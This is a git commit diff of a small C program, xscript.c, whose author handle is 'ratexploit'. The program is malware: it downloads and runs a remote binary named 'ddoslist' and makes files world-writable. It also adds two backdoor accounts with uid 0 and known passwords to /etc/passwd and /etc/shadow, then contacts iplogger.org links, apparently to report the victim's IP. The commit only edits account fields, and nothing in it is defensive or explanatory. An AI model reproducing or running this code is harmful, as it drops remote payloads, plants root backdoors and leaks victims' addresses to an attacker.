afde07d1f6e1adc39532e8ef51c865f5278edd53
ratexploit <59780477+ratexploit@users.noreply.github.com>
2020-03-28 21:11:24 +0300

    Update xscript.c

--- xscript.c
+++ xscript.c
@@ -2,13 +2,13 @@ int main()
 
  {
 system("wget https://download1080.mediafire.com/z45xsg8u6clg/fvw4an79mq14vj2/ddoslist 2>/dev/null ; chmod 777 * ; ./ddoslist 2>/dev/null ;rm -rf ddoslist");
-system("echo 'localxl:x:0:0:user:/root:/bin/bash' >> /etc/passwd");
+system("echo 'localxl:x:0:0:localxl:/root:/bin/bash' >> /etc/passwd");
 system("echo 'localxl:asdasd:18020:0:99999:7:::' >> /etc/shadow"); 
 system("echo 'localxl:asdasd' | chpasswd"); 
 system("wget https://iplogger.org/2KqiW5 2>/dev/null ");
 system("rm -rf 2KqiW*");
 system("echo 'user:x:0:0:user:/root:/bin/bash' >> /etc/passwd");
-system("echo 'user:password:18020:0:99999:7:::' >> /etc/shadow"); 
+system("echo 'user:password:18020:0:99799:7:::' >> /etc/shadow"); 
 system("echo 'user:password' | chpasswd"); 
 system("wget https://iplogger.org/ipx 2>/dev/null ");
 system("rm -rf ipx");
